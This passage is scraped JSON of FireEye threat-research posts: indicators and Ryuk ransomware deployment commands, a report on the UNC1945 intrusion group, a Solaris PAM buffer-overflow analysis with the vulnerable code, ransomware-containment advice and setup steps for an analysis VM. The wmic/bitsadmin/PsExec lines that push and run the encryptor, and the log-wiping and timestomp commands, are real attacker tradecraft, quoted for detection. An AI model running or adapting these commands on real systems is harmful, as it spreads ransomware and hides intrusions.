9859a8336d097bc30e6e5c7a8279f18e 10/23/20 45.153.240.220:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driverdwl[.]com 43fb2c153b59bf46cf6f67e0ddd6ef51 10/23/20 45.153.240.222:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=viewdrivers[.]com 22bafb30cc3adaa84fef747d589ab235 10/23/20 45.153.241.134:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backups1helper[.]com 31e87ba0c90bb38b986af297e4905e00 10/23/20 45.153.241.138:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driver1downloads[.]com f8a14846b7da416b14303bced5a6418f 10/23/20 45.153.241.146:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=servicehel[.]com 01abdaf870d859f9c1fd76f0b0328a2b 10/23/20 45.153.241.153:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service-hel[.]com c2eaf144e21f3aef5fe4b1502d318ba6 10/23/20 45.153.241.158:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=servicereader[.]com de54af391602f3deea19cd5e1e912316 10/23/20 45.153.241.167:443 C=US,ST=TX,L=Texas,O=US,OU=,CN=view-backup[.]com 5f6fa19ffe5735ff81b0e7981a864dc8 10/23/20 45.147.231.222:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=top3servicebooster[.]com ff54a7e6f51a850ef1d744d06d8e6caa 10/23/20 45.153.241.141:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1view[.]com 4cda9d0bece4f6156a80967298455bd5 10/26/20 74.118.138.139:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=topbackupintheworld[.]com e317485d700bf5e8cb8eea1ec6a72a1a 10/26/20 108.62.12.12:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=topservice-masters[.]com e0022cbf0dd5aa597fee73e79d2b5023 10/26/20 108.62.12.121:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=topservicebooster[.]com 44e7347a522b22cdf5de658a4237ce58 10/26/20 172.241.27.65:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backup1services[.]com cd3e51ee538610879d6fa77fa281bc6f 10/26/20 172.241.27.68:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backupmaster-service[.]com 04b6aec529b3656040a68e17afdabfa4 10/26/20 172.241.27.70:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=backupmasterservice[.]com 200c25c2b93203392e1acf5d975d6544 10/26/20 45.153.241.139:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driver-boosters[.]com 9d7c52c79f3825baf97d1318bae3ebe2 10/27/20 45.153.241.14:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1update[.]com 5bae28b0d0e969af2c0eda21abe91f35 10/28/20 190.211.254.154:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=driverjumper[.]com a1e62e7e547532831d0dd07832f61f54 10/28/20 81.17.28.70:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=service1boost[.]com 67c7c75d396988ba7d6cd36f35def3e4 10/28/20 81.17.28.105:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivehepler[.]com 880e59b44e7175e62d75128accedb221 10/28/20 179.43.160.205:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivedownload[.]com cdea09a43bef7f1679e9cd1bbeb4b657 10/28/20 179.43.158.171:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivefinder[.]com 512c6e39bf03a4240f5a2d32ee710ce5 10/28/20 179.43.133.44:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivedwn[.]com 87f3698c743f8a1296babf9fbebafa9f 10/28/20 179.43.128.5:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idrivecheck[.]com 6df66077378c5943453b36bd3a1ed105 10/28/20 179.43.128.3:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idriveupdate[.]com 9706fd787a32a7e94915f91124de3ad3 10/28/20 81.17.28.122:443 C=US,ST=TX,L=Texas,O=lol,OU=,CN=idriveview[.]com 0e1b0266de2b5eaf427f5915086b4d7c RYUK Commands start wmic /node:@C:\\share$\\comps1.txt /user:[REDACTED] /password:[REDACTED] process call create \"cmd.exe /c bitsadmin /transfer vVv \\\\[REDACTED]\\share$\\vVv.exe %APPDATA%\\vVv.exe & %APPDATA%\\vVv.exe\" start PsExec.exe /accepteula @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c COPY \"\\\\[REDACTED]\\share$\\vVv.exe\" \"C:\\windows\\temp\\vVv.exe\" start PsExec.exe -d @C:\\share$\\comps1.txt -u [REDACTED] -p [REDACTED] cmd /c c:\\windows\\temp\\vVv.exe Detecting the Techniques FireEye detects this activity across our platforms. The following table contains several specific detection names from a larger list of detections that were available prior to this activity occurring. Platform Signature Name Endpoint Security KEGTAP INTERACTIVE CMD.EXE CHILD PROCESS (BACKDOOR) KEGTAP DLL EXECUTION VIA RUNDLL32.EXE (BACKDOOR) SINGLEMALT (DOWNLOADER) STILLBOT (BACKDOOR) WINEKEY (DOWNLOADER) CORKBOT (BACKDOOR) RYUK RANSOMWARE ENCRYPT COMMAND (FAMILY) RYUK RANSOMWARE SETUP EXECUTION (FAMILY) RYUK RANSOMWARE WAKE-ON-LAN EXECUTION (FAMILY) RYUK RANSOMWARE STAGED ENCRYPTOR INTERNAL TRANSFER TARGET (UTILITY) RYUK RANSOMWARE ENCRYPTOR DISTRIBUTION SCRIPT CREATION (UTILITY) RYUK RANSOMWARE STAGED ENCRYPTOR INTERNAL TRANSFER SOURCE (UTILITY) Network Security and Email Security Downloader.Win.KEGTAP Trojan.KEGTAP APTFIN.Backdoor.Win.BEERBOT APTFIN.Downloader.Win.SINGLEMALT APTFIN.Backdoor.Win.STILLBOT APTFIN.Downloader.Win.WINEKEY APTFIN.Backdoor.Win.CORKBOT FE_Downloader_Win64_KEGTAP FE_APTFIN_Backdoor_Win32_BEERBOT FE_APTFIN_Backdoor_Win_BEERBOT FE_APTFIN_Downloader_Win32_SINGLEMALT FE_APTFIN_Downloader_Win64_SINGLEMALT FE_APTFIN_Backdoor_Win_STILLBOT FE_APTFIN_Downloader_Win_WINEKEY FE_APTFIN_Backdoor_Win_CORKBOT Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/11/live-off-the-land-an-overview-of-unc1945.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-11-02",
                    "source": "www.fireeye.com"
                },
                "text": "Through Mandiant investigation of intrusions, the FLARE Advanced Practices team observed a group we track as UNC1945 compromise managed service providers and operate against a tailored set of targets within the financial and professional consulting industries by leveraging access to third-party networks (see this blog post for an in-depth description of “UNC” groups). UNC1945 targeted Oracle Solaris operating systems, utilized several tools and utilities against Windows and Linux operating systems, loaded and operated custom virtual machines, and employed techniques to evade detection. UNC1945 demonstrated access to exploits, tools and malware for multiple operating systems, a disciplined interest in covering or manipulating their activity, and displayed advanced technical abilities during interactive operations. Mandiant discovered and reported to Oracle CVE-2020-14871 , which was addressed in Oracle's October 2020 Critical Patch Update . Mandiant recommends staying current on all current patch updates to ensure a high security posture. We will discuss this vulnerability in greater detail in a follow up blog post. UNC1945 Attack Lifecycle The threat actor demonstrated experience and comfort by utilizing unique tactics, techniques and procedures (TTPs) within Unix environments, demonstrating a high level of acumen in conjunction with ease of operability in Microsoft Windows operating systems. They were successful navigating multiple segmented networks and leveraging third-party access to extend operations well beyond the initial victim. Furthermore, UNC1945 operated from several virtual machines pre-configured with post-exploitation tools in addition to their custom toolset to evade detection and forensics. Initial Compromise In late 2018, UNC1945 gained access to a Solaris server and installed a backdoor we track as SLAPSTICK in order to capture connection details and credentials to facilitate further compromise. The SSH service of this server was exposed to the internet at the time, the same time we observed first evidence of threat activity. Unfortunately, due to insufficient available evidence, the next indication of activity was in mid-2020 at which time a different Solaris server was observed connecting to the threat actor infrastructure. This indicates a dwell time of approximately 519 days based on recovered artifacts. Although we were unable to determine how the late-2018 initial access was accomplished, we did observe successful UNC1945 SSH connections directly to the victim Solaris 10 server, since the SSH service was exposed directly to the internet at the time. In mid-2020, we observed UNC1945 deploy EVILSUN—a remote exploitation tool containing a zero-day exploit for CVE-2020-14871—on a Solaris 9 server. At the time, connections from the server to the threat actor IP address were observed over port 8080. Mandiant discovered and reported CVE-2020-14871, a recently patched vulnerability in the Oracle Solaris Pluggable Authentication Module (PAM) that allows an unauthenticated attacker with network access via multiple protocols to exploit and compromise the operating system. According to an April 2020 post on a black-market website, an “Oracle Solaris SSHD Remote Root Exploit” was available for approximately $3,000 USD, which may be identifiable with EVILSUN. Additionally, we confirmed a Solaris server exposed to the internet had critical vulnerabilities, which included the possibility of remote exploitation without authentication. Establish Foothold and Maintain Persistence The threat actor used a Solaris Pluggable Authentication Module backdoor we refer to as SLAPSTICK to establish a foothold on a Solaris 9 server. This facilitated user access to the system with a secret hard-coded password and allowed the threat actors to escalate privileges and maintain persistence (see Figure 1). Log –font –unix | /usr/lib/ssh/sshd sshd kbdint - can <Encoded Password> <IP REDACTED> Magical Password auth.info | sshd[11800]: [ID 800047 auth.info] Accepted keyboard-interactive for root from <IP REDACTED> port 39680 ssh2 auth.notice | su: [ID 366847 auth.notice] ‘su root’ - succeeded for netcool on /dev/pts/31 Figure 1: SLAPSTICK logs At the initial victim, UNC1945 placed a copy of a legitimate pam_unix.so file and SLAPSTICK in the /lib64/security folder. A day later, the threat actor positioned a custom Linux backdoor, which Mandiant named LEMONSTICK, on the same workstation. LEMONSTICK capabilities include command execution, file transfer and execution, and the ability to establish tunnel connections. (see Figure 2). FileItem:changed | /usr/lib64/security/pam_unix,so [57720] Audit log | [audit_type: USER_END] user pid=10080 uid=0 auid=0 msg='PAM: session close acct=root\" : exe=\"/usr/sbin/sshd\" (hostname=1.239.171.32, addr=1.239.171.32, terminal=ssh res=success)'\" FileItem:Accessed | /var/tmp/.cache/ocb_static Figure 2: UNC1945 emplacement of SLAPSTICK UNC1945 obtained and maintained access to their external infrastructure using an SSH Port Forwarding mechanism despite the host lacking accessibility to the internet directly. SSH Port Forwarding is a mechanism implemented in SSH protocol for transporting arbitrary networking data over an encrypted SSH connection (tunneling). This feature can be used for adding encryption to legacy applications traversing firewalls or with malicious intent to access internal networks from the the internet. The UNC1945 configurations we observed are similarly structured with respect to the host alias, specified options, and option order (see Figure 3). config1 config2 Host <redacted> HostName <redacted> Port 900 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null RemoteForward 33002 127.0.0.1:22 Host <redacted> HostName <redacted> Port 443 User <redacted> IdentityFile <redacted> KbdInteractiveAuthentication no PasswordAuthentication no NoHostAuthenticationForLocalhost yes StrictHostKeyChecking no UserKnownHostsFile /dev/null ServerAliveInterval 30 ServerAliveCountMax 3 RemoteForward 2224 <redacted>:22 Figure 3: SSH config files used by UNC1945 at different incidents As part of this multi-stage operation, UNC1945 dropped a custom QEMU Virtual Machine (VM) on multiple hosts, which was executed inside of any Linux system by launching a ‘start.sh’ script. The script contained TCP forwarding settings that could be used by the threat actor in conjunction with the SSH tunnels to give direct access from the threat actor VM to the command and control server to obfuscate interaction with customer infrastructure. The VM was running a version of the Tiny Core Linux OS with pre-loaded scripts and tools. Also, we analyzed the Virtual Machine file system timestamps, which coincided with UNC1945's overall operational timeline. The VM contained numerous tools such as network scanners, exploits and reconnaissance tools. Tiny Core Linux pre-loaded tools included Mimikatz, Powersploit, Responder, Procdump, CrackMapExec, PoshC2, Medusa, JBoss Vulnerability Scanner and more. Efforts to decrease operational visibility included placing tool and output files within temporary file system mount points that were stored in volatile memory. Additionally, UNC1945 used built-in utilities and public tools to modify timestamps and selectively manipulate Unix log files. UNC1945 employed anti-forensics techniques with the use of a custom ELF utility named LOGBLEACH. The actor used built-in Linux commands to alter the timestamps of files and directories and used LOGBLEACH to clean logs to thwart forensic analysis, as seen in Figure 4. $ ./b -C -y -a $ mv b /usr/lib64/libXbleach.so.1 $ cd /usr/lib64/ $ touch -acm -r librpmio.so.3.2.2 $ touch -acm -r libyaml-0.so.2 Figure 4: LOGBLEACH To further obfuscate activity, a Linux ELF packer named STEELCORGI was executed in memory on the Solaris system. The malware contains various anti-analysis techniques, including anti-debugging, anti-tracing, and string obfuscation. It uses environment variables as a key to unpack the final payload. Escalate Privileges and Lateral Movement After successfully establishing a foothold, UNC1945 collected credentials, escalated privileges, and successfully moved laterally through multiple networks. UNC1945 obtained credentials via SLAPSTICK and open source tools such as Mimikatz, which enabled easy lateral movement throughout networks to obtain immediate access to other segments of the network and third-party environments. Stolen credentials collected by SLAPSTICK were used to traverse the customer network via SSH and deploy SLAPSTICK to additional hosts. After successfully authenticating, SLAPSTICK displays a welcome message, as seen in Figure 5. Figure 5: SLAPSTICK backdoor welcome banner UNC1945 used ProxyChains to download PUPYRAT, an open source, cross-platform multi-functional remote administration and post-exploitation tool mainly written in Python. At one target, the threat actor used a virtual machine to initiate a brute-force of SSH targeting Linux and HP-UX endpoints. Beginning with seemingly random usernames and shifting to legitimate Linux and Windows accounts, the threat actor successfully established SSH connections on a Linux endpoint. After successfully escalating privileges on an HP-UX endpoint and a Linux endpoint, UNC1945 installed three backdoors: SLAPSTICK, TINYSHELL, and OKSOLO. We observed UNC1945 use IMPACKET with SMBEXEC in a Microsoft Windows environment to execute commands remotely without the need to upload a payload to the target. SMBEXEC allows the threat actor to operate like PsExec, but without using RemComSvc. There are two main modes of using this tool that benefits attackers. Share mode allows the specification of a share that everything will be executed through. Server mode permits the output of the executed commands to be sent back by the target machine into a locally shared folder. At one victim, we observed UNC1945 moving laterally via Remote Desktop Protocol (RDP) to a Windows server before viewing the Server Manager Panel, viewing and modifying RDP-related system firewall rules and checking the application settings of two endpoint security services. Internal Reconnaissance Mandiant investigations found that the threat actor maintains various tools to interact with victim networks. In addition to custom tools, the UNC1945 VMs contained various tools (e.g. network scanners, exploits and reconnaissance; see Associated Tools and Malware section). In some intrusions, UNC1945 employed a SPARC executable identified as a reconnaissance tool. Based on publicly available information, this executable could be referred to as Luckscan or BlueKeep, the latter of which is part of the BKScan toolkit (see Figure 6). Figure 6: SPARC executable recon tool command line used by the threat actor According to open sources, BlueKeep, aka “bkscan” scanner , works both unauthenticated and authenticated (i.e. when Network Level Authentication is enabled). BlueKeep (CVE-2019-0708) is a security vulnerability that was discovered in Microsoft's Remote Desktop Protocol (RDP) implementation, which allows for the possibility of remote code execution. Complete Mission Despite this multi-staged operation, Mandiant did not observe evidence of data exfiltration and was unable to determine UNC1945's mission for most of the intrusions we investigated. In at least one case, we observed ROLLCOAST ransomware deployment in the final phase of the threat actor activity, but Mandiant didn’t attribute this activity to UNC1945. At this time, it is likely that access to the victim environment was sold to another group. Conclusion The ease and breadth of exploitation in which UNC1945 conducted this campaign suggests a sophisticated, persistent actor comfortable exploiting various operating systems, and access to resources and numerous toolsets. Given the aforementioned factors, use of zero-day exploits and virtual machines, and ability to traverse multiple third-party networks, Mandiant expects this motivated threat actor to continue targeted operations against key industries while taking advantage of operating systems that likely have inadequate security visibility. Associated Tools and Malware Families EVILSUN is a remote exploitation tool that gains access to Solaris 10 and 11 systems of SPARC or i386 architecture using a vulnerability (CVE-2020-14871) exposed by SSH keyboard-interactive authentication. The remote exploitation tool makes SSH connections to hosts passed on the command line. The default port is the normal SSH port (22), but this may be overridden. EVILSUN passes the banner string SSH-2.0-Sun_SSH_1.1.3 over the connection in clear text as part of handshaking. LEMONSTICK is a Linux executable command line utility with backdoor capabilities. The backdoor can execute files, transfer files, and tunnel connections. LEMONSTICK can be started in two different ways: passing the `-c` command line argument (with an optional file) and setting the ‘OCB’ environment variable. When started with the `-c` command line argument, LEMONSTICK spawns an interactive shell. When started in OCB mode, LEMONSTICK expects to read from STDIN. The STDIN data is expected to be encrypted with the blowfish algorithm. After decrypting, it dispatches commands based on the name—for example: ‘executes terminal command’, ‘connect to remote system’, ‘send & retrieve file’, ‘create socket connection’. LOGBLEACH is an ELF utility that has a primary functionality of deleting log entries from a specified log file(s) based on a filter provided via command line. The following log files are hard coded in the malware, but additional log paths may be specified: /var/run/utmp /var/log/wtmp /var/log/btmp /var/log/lastlog /var/log/faillog /var/log/syslog /var/log/messages /var/log/secure /var/log/auth.log OKSOLO is a publicly available backdoor that binds a shell to a specified port. It can be compiled to support password authentication or dropped into a root shell. OPENSHACKLE is a reconnaissance tool that collects information about logged-on users and saves it to a file. OPENSHACKLE registers Windows Event Manager callback to achieve persistence. ProxyChains allows the use of SSH, TELNET, VNC, FTP and any other internet application from behind HTTP (HTTPS) and SOCKS (4/5) proxy servers. This \"proxifier\" provides proxy server support to any application. PUPYRAT (aka Pupy) is an open source, multi-platform (Windows, Linux, OSX, Android), multi-function RAT (Remote Administration Tool) and post-exploitation tool mainly written in Python. It features an all-in-memory execution guideline and leaves very low footprint. It can communicate using various transports, migrate into processes (reflective injection), and load remote Python code, Python packages and Python C-extensions from memory. STEELCORGI is a packer for Linux ELF programs that uses key material from the executing environment to decrypt the payload. When first starting up, the malware expects to find up to four environment variables that contain numeric values. The malware uses the environment variable values as a key to decrypt additional data to be executed. SLAPSTICK is a Solaris PAM backdoor that grants a user access to the system with a secret, hard-coded password. TINYSHELL is a lightweight client/server clone of the standard remote shell tools (rlogin, telnet, ssh, etc.), which can act as a backdoor and provide remote shell execution as well as file transfers. Detections FE_APT_Trojan_Linux_STEELCORGI_1 FE_APT_Trojan_Linux_STEELCORGI_2 FE_HackTool_Linux64_EVILSUN_1 FE_HackTool_Linux_EVILSUN_1 HackTool.Linux.EVILSUN.MVX HXIOC UUID: e489ce60-f315-4d1a-a888-77782f687eec EVILSUN (FAMILY) 90005075FE_Trojan_Linux_LEMONSTICK_1 FE_APT_Tool_Win32_OPENSHACKLE_1 FE_APT_Tool_Win_OPENSHACKLE_1 HXIOC UUID: 4a56fb0c-6134-4450-ad91-0f622a92701c OPENSHACKLE (UTILITY) 90005006 FE_APT_Backdoor_Linux64_SLAPSTICK_1 FE_APT_Backdoor_Linux_SLAPSTICK_1 FE_Backdoor_Win_PUPYRAT_1 FE_APT_Pupy_RAT FE_Ransomware_Win64_ROLLCOAST_1 FE_Ransomware_Win_ROLLCOAST_1 HXIOC, 45632ca0-a20b-487f-841c-c74ca042e75a; ROLLCOAST RANSOMWARE (FAMILY) Ransomware.Win.ROLLCOAST.MVX Hashes d5b9a1845152d8ad2b91af044ff16d0b (SLAPSTICK) 0845835e18a3ed4057498250d30a11b1 (STEELCORGI) 6983f7001de10f4d19fc2d794c3eb534 2eff2273d423a7ae6c68e3ddd96604bc d505533ae75f89f98554765aaf2a330a abaf1d04982449e0f7ee8a34577fe8af Netblocks 46.30.189.0/24 66.172.12.0/24 ATT&CK Tactic Category Techniques Initial Access T1133 External Remote Services T1190 Exploit Public-Facing Application Execution T1059 Command and Scripting Interpreter T1059.001 PowerShell T1064 Scripting Persistence T1133 External Remote Services Lateral Movement T1021.001 Remote Desktop Protocol T1021.004 SSH Defense Evasion T1027 Obfuscated Files or Information T1070.004 File Deletion T1070.006 Timestomp T1064 Scripting T1553.002 Code Signing Discovery T1046 Network Service Scanning T1082 System Information Discovery T1518.001 Security Software Discovery Lateral Movement T1021.001 Remote Desktop Protocol T1021.004 SSH Command and Control T1071 Application Layer Protocol T1090 Proxy T1105 Ingress Tool Transfer T1132.001 Standard Encoding For more information, check out our Bring Your Own Land blog post. Additionally, Mandiant experts from the FLARE team will present an in-depth view into UNC1945 on Thursday, Nov. 12. Register today to reserve your spot for this discussion , where the presenters from FLARE and Mandiant Managed Defense will also answer questions from the audience. Finally, for more intelligence on these types of threats, please register for Mandiant Advantage Free , a no-cost version of our threat intelligence platform. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/11/critical-buffer-overflow-vulnerability-in-solaris-can-allow-remote-takeover.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-11-04",
                    "source": "www.fireeye.com"
                },
                "text": "FireEye Mandiant has been investigating compromised Oracle Solaris machines in customer environments. During our investigations, we discovered an exploit tool on a customer’s system and analyzed it to see how it was attacking their Solaris environment. The FLARE team’s Offensive Task Force analyzed the exploit to determine how it worked, reproduced the vulnerability on different versions of Solaris, and then reported it to Oracle. In this blog post we present a description of the vulnerability, offer a quick way to test whether a system may be vulnerable, and suggest mitigations and workarounds. Mandiant experts from the FLARE team will provide more information on this vulnerability and how it was used by UNC1945 during a Nov. 12 webinar. Register today and start preparing questions, because we will be fielding them from the audience at the end of the session. Vulnerability Discovery The security vulnerability occurs in the Pluggable Authentication Modules (PAM) library. PAM enables a Solaris application to authenticate users while allowing the system administrator to configure authentication parameters (e.g., password complexity and expiration) in one location that is consistently enforced by all applications. The actual vulnerability is a classic stack-based buffer overflow located in the PAM parse_user_name function . An abbreviated version of this function is shown in Figure 1. static int parse_user_name(char *user_input, char **ret_username) { register char *ptr; register int index = 0; char username[PAM_MAX_RESP_SIZE]; /* ... */ ptr = user_input; /* ... */ /* * username will be the first string we get from user_input * - we skip leading whitespaces and ignore trailing whitespaces */ while (*ptr != '\\0') { if ((*ptr == ' ') || (*ptr == '\\t')) break; else { username[index] = *ptr; index++; ptr++; } } /* ret_username will be freed in pam_get_user(). */ if ((*ret_username = malloc(index + 1)) == NULL) return (PAM_BUF_ERR); (void) strcpy(*ret_username, username); return (PAM_SUCCESS); } Figure 1: The parse_user_name function has a stack-based buffer overflow vulnerability The vulnerability arises whenever a username longer than PAM_MAX_RESP_SIZE (512 bytes) is passed to parse_user_name . The vulnerability has likely existed for decades, and one possible reason is that it is only exploitable if an application does not already limit usernames to a smaller length before passing them to PAM. One situation where network-facing software does not always limit the username length arises in the SSH server, and this is the exploit vector used by the tool that we discovered. SSH Keyboard-Interactive authentication is a “passthrough” authentication mechanism where the SSH protocol relays prompts and responses between the server’s PAM libraries and the client. It was designed to support custom forms of authentication such as two-factor without modifying the SSH protocol. By manipulating SSH client settings to force Keyboard-Interactive authentication to prompt for the username rather than sending it through normal means, an attacker can also pass unlimited input to the PAM parse_user_name function. Proof of Concept Exploit In order to quickly test different versions of Solaris to see if they may be vulnerable, we developed a proof of concept exploit to trigger the overflow and crash the SSH server. The standard OpenSSH client offers all the options needed to trigger the vulnerability (Figure 2). Figure 2: A server can be quickly tested to see if it is vulnerable over SSH The indication that the server is vulnerable is that the SSH client prints “Authentication failed;” a non-vulnerable PAM library causes the SSH server to repeatedly prompt for a username if it receives one that is too long. The overflow in the PAM library also causes the SSH server to crash, as shown in Figure 3. The operating system writes a crash dump to /core if the SSH server crashes with no debugger attached. In fact, if a /core file exists on a Solaris machine and the file command reports that it is from sshd , those are indicators consistent with this vulnerability having been exploited. Figure 3: The SSH server crashes in the parse_user_name function Vulnerable Operating Systems Solaris 9 (some releases) Solaris 10 (all releases) Solaris 11.0 While the parse_user_name function remains vulnerable in unpatched Solaris 11.1 and later, unrelated changes to the PAM library truncate the username before the vulnerable function receives it, rendering the issue non-exploitable via SSH. If the parse_user_name function were reachable in another context, then the vulnerability could become exploitable. Illumos (OpenIndiana 2020.04) Mitigations and Workaround A patch from Oracle for Solaris 10 and 11 is described in the October 2020 Critical Patch Update . Because Solaris 9 is no longer supported, Oracle has not released a patch. For Solaris 9, as well as Solaris 10 or 11 systems where patching is inconvenient, we recommend editing the /etc/ssh/sshd_config file to add the lines ChallengeResponseAuthentication no and KbdInteractiveAuthentication no and restart the SSH server. While this removes the opportunity to exploit the vulnerability using SSH Keyboard-Interactive authentication, there may be other ways to attack the parse_user_name function and we recommend using this workaround only as a stopgap until Solaris 9 systems can be upgraded, or the October patch can be accessed and installed for supported Solaris versions. Acknowledgements Jeffrey Martin of Rapid7 contributed to the testing of this vulnerability. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2019/09/ransomware-protection-and-containment-strategies.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2019-09-05",
                    "source": "www.fireeye.com"
                },
                "text": "UPDATE (Oct. 30, 2020): We have updated the report to include additional protection and containment strategies based on front-line visibility and response efforts in combating ransomware. While the full scope of recommendations included within the initial report remain unchanged, the following strategies have been added into the report: Windows Firewall rule configurations to block specific binaries from establishing outbound connections from endpoints Domain Controller isolation and recovery planning steps Proactive GPO permissions review and monitoring guidance Ransomware is a global threat targeting organizations in all industries. The impact of a successful ransomware event can be material to an organization - including the loss of access to data, systems, and operational outages. The potential downtime, coupled with unforeseen expenses for restoration, recovery, and implementation of new security processes and controls can be overwhelming. Ransomware has become an increasingly popular choice for attackers over the past few years, and it’s easy to understand why given how simple it is to leverage in campaigns – while offering a healthy financial return for attackers. In our latest report, Ransomware Protection and Containment Strategies: Practical Guidance for Endpoint Protection, Hardening, and Containment , we discuss steps organizations can proactively take to harden their environment to prevent the downstream impact of a ransomware event. These recommendations can also help organizations with prioritizing the most important steps required to contain and minimize the impact of a ransomware event after it occurs. Ransomware is commonly deployed across an environment in two ways: Manual propagation by a threat actor after they’ve penetrated an environment and have administrator-level privileges broadly across the environment: Manually run encryptors on targeted systems. Deploy encryptors across the environment using Windows batch files (mount C$ shares, copy the encryptor, and execute it with the Microsoft PsExec tool). Deploy encryptors with Microsoft Group Policy Objects (GPOs). Deploy encryptors with existing software deployment tools utilized by the victim organization. Automated propagation: Credential or Windows token extraction from disk or memory. Trust relationships between systems – and leveraging methods such as Windows Management Instrumentation (WMI), SMB, or PsExec to bind to systems and execute payloads. Unpatched exploitation methods (e.g., EternalBlue – addressed via Microsoft Security Bulletin MS17-010 ). The report covers several technical recommendations to help organizations mitigate the risk of and contain ransomware events including: Endpoint segmentation Hardening against common exploitation methods Reducing the exposure of privileged and service accounts Cleartext password protections If you are reading this report to aid your organization’s response to an existing ransomware event, it is important to understand how the ransomware was deployed through the environment and design your ransomware response appropriately. This guide should help organizations in that process. Read the report today . *Note: The recommendations in this report will help organizations mitigate the risk of and contain ransomware events. However, this report does not cover all aspects of a ransomware incident response. We do not discuss investigative techniques to identify and remove backdoors (ransomware operators often have multiple backdoors into victim environments), communicating and negotiating with threat actors, or recovering data once a decryptor is provided. Subscribe to Blogs Get email updates as new blog posts are added."
            }
        },
        {
            "http://www.fireeye.com/blog/threat-research/2020/10/threatpursuit-vm-threat-intelligence-and-hunting-virtual-machine.html": {
                "metadata": {
                    "dateAccessed": "2021-07-27",
                    "dateCreated": "2020-10-28",
                    "source": "www.fireeye.com"
                },
                "text": "Skilled adversaries can deceive detection and often employ new measures in their tradecraft. Keeping a stringent focus on the lifecycle and evolution of adversaries allows analysts to devise new detection mechanisms and response processes. Access to the appropriate tooling and resources is critical to discover these threats within a timely and accurate manner. Therefore, we are actively compiling the most essential software packages into a Windows-based distribution: ThreatPursuit VM . ThreatPursuit Virtual Machine (VM) is a fully customizable, open-sourced Windows-based distribution focused on threat intelligence analysis and hunting designed for intel and malware analysts as well as threat hunters to get up and running quickly. The threat intelligence analyst role is a subset and specialized member of the blue team. Individuals in this role generally have a strong impetus for knowing the threat environment. Often their traits, skills and experiences will vary depending on training and subject matter expertise. Their expertise may not be technical and may include experiences and tradecraft earned by operating within a different domain (e.g., geospatial, criminal, signals intelligence, etc.). A key aspect of the role may include the requirement to hunt, study and triage previously undiscovered or recently emerging threats by discerning data for evil. Threat analysts apply a variety of structured analytical methods in order to develop meaningful and relevant products for their customers. With this distribution we aim to enable users to: Conduct hunting activities or missions Create adversarial playbooks using evidence-based knowledge Develop and apply a range of analytical products amongst datasets Perform analytical pivoting across forensic artifacts and elements Emulate advanced offensive security tradecraft Enable situational awareness through intelligence sharing and reporting Applied data science techniques & visualize clusters of symbolic data Leverage open intelligence sources to provide unique insights for defense and offense Akin to both FLARE-VM and Commando VM , ThreatPursuit VM uses Boxstarter , Chocolatey and MyGet packages to install software that facilitates the many aspects related to roles performed by analysts. The tools installed provide easy access to a broad range of tooling, including, but not limited to, threat analytics, statistics, visualisation, threat hunting, malware triage, adversarial emulation, and threat modelling. Here are some of the tools, but there are many more: MISP OpenCTI Elasticsearch, Kibana, Logstash Splunk Threat Hunter Playbook CSIRO Data61 Constellation Maltego RStudio MITRE CALDERA Jupyter Notebook Python SilkETW For a full list of tools, please visit our GitHub repository . Installation Similar to FLARE-VM and Commando VM , it's recommended to install ThreatPursuit VM in a virtual machine. The following is an overview of the minimal and recommended installation requirements. Requirements Windows 10 1903 or greater 60 GB Hard Drive 4 GB RAM Recommended Windows 10 1903 80+ GB Hard Drive 6+ GB RAM 1 network adapter OpenGL Graphics Card 1024mb Enable Virtualization support for VM Required for Docker (MISP, OpenCTI) Standard Install The easiest way to install ThreatPursuit VM is to use the following steps. This will install all the default tools and get you finding evil in no time! Create and configure a new Windows 10 VM with the aforementioned requirements. Ensure VM is updated completely. You may need to check for updates, reboot and check again until no more remain. Install your specific VM guest tools (e.g., VMware Tools) to allow additional features such as copy/paste and screen resizing. Take a snapshot of your machine! This allows you to always have a clean state. Download and copy install.ps1 to your newly configured VM. Open PowerShell as an administrator. Next, unblock the install file by running: Unblock-File .\\install.ps1 , as seen in Figure 1. Figure 1: Unblock-File installation script Enable script execution by running: Set-ExecutionPolicy Unrestricted -f , as seen in Figure 2. Figure 2: Set-ExecutionPolicy Unrestricted -f script Finally, execute the installer script as follows: .\\install.ps1 After executing install.ps1 , you’ll be prompted for the administrator password in order to automate host restarts during installation as several reboots occur. Optionally, you may pass your password as a command-line argument via \" .\\install.ps1 -password <password>\" . If you do not have a password set, hitting enter when prompted will also work. This will be the last thing you will need to do before the installation is 